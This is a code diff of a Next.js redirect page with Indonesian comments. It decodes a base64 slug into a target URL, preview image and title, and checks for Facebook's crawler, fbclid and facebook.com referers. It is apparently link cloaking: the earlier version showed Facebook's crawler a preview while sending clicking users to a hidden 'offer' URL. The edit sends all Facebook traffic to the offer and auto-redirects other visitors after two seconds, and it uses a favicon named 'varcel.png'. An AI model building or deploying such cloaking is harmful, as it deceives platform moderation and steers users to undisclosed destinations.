@@ -8,28 +8,30 @@ interface Props {
   title: string;
 }
 
-const offerUrl = "https://example.com/offer"; // Ganti dengan URL offer kamu
+const offerUrl = "https://example.com/offer"; // ← ganti ke URL yang kamu mau
 
 export const getServerSideProps: GetServerSideProps = async (context) => {
   const slugParts = context.params?.slug || [];
-  const encoded = slugParts[slugParts.length - 1]; // Ambil bagian terakhir dari [...slug]
-  const fbclid = context.query.fbclid;
-  const referer = context.req.headers.referer || "";
-  const ua = context.req.headers["user-agent"] || "";
+  const encoded = Array.isArray(slugParts) ? slugParts.join("/") : slugParts;
 
   if (!encoded) return { notFound: true };
 
   try {
-    const decoded = Buffer.from(encoded, "base64").toString("utf-8");
-    const { redirectUrl, imageUrl, title } = JSON.parse(decoded);
+    const json = Buffer.from(encoded, "base64").toString("utf-8");
+    const { redirectUrl, imageUrl, title } = JSON.parse(json);
 
-    if (!redirectUrl || !imageUrl) throw new Error("Invalid data");
+    const fbclid = context.query.fbclid || "";
+    const referer = context.req.headers.referer || "";
+    const ua = context.req.headers["user-agent"] || "";
 
     const isFacebookBot =
-      ua.includes("facebookexternalhit") || ua.includes("Facebot");
+      ua.includes("facebookexternal") ||
+      ua.includes("Facebot") ||
+      fbclid ||
+      referer.includes("facebook.com");
 
-    // Jika bukan bot, tapi datang dari Facebook (klik user), redirect langsung
-    if ((referer.includes("facebook.com") || fbclid) && !isFacebookBot) {
+    // 🔁 Redirect langsung ke offer jika dari Facebook
+    if (isFacebookBot) {
       return {
         redirect: {
           destination: offerUrl,
@@ -38,7 +40,7 @@ export const getServerSideProps: GetServerSideProps = async (context) => {
       };
     }
 
-    // Jika bot (crawler), render OG preview
+    // ✅ Selain itu, tampilkan halaman dengan preview dan auto-redirect ke link aslinya
     return {
       props: {
         redirectUrl,
@@ -46,7 +48,7 @@ export const getServerSideProps: GetServerSideProps = async (context) => {
         title: title || "Redirecting...",
       },
     };
-  } catch (err) {
+  } catch (e) {
     return { notFound: true };
   }
 };
@@ -55,7 +57,7 @@ export default function RedirectPage({ redirectUrl, imageUrl, title }: Props) {
   useEffect(() => {
     const timer = setTimeout(() => {
       window.location.href = redirectUrl;
-    }, 2500);
+    }, 2000);
     return () => clearTimeout(timer);
   }, [redirectUrl]);
 
@@ -65,25 +67,23 @@ export default function RedirectPage({ redirectUrl, imageUrl, title }: Props) {
         <title>{title}</title>
         <meta name="description" content={`Read more at ${redirectUrl}`} />
         <meta property="og:title" content={title} />
-        <meta property="og:description" content="Click to read more on this page." />
+        <meta name="description" content={`Read more at ${redirectUrl}`} />
         <meta property="og:url" content={redirectUrl} />
         <meta property="og:type" content="website" />
         {imageUrl && <meta property="og:image" content={imageUrl} />}
+        <link rel="image_src" href={imageUrl} />
         <link rel="icon" href="/varcel.png" type="image/x-icon" />
-        <style>
-          {`
-            @keyframes spin {
-              0% { transform: rotate(0deg); }
-              100% { transform: rotate(360deg); }
-            }
-          `}
-        </style>
+        <style>{`
+          @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+          }
+        `}</style>
       </Head>
 
       <main style={styles.container}>
         <div style={styles.loader}></div>
         <div style={styles.loadingText}>Please wait...</div>
-        {/* Gambar tersembunyi untuk preload dan social preview */}
         {imageUrl && (
           <img
             src={imageUrl}
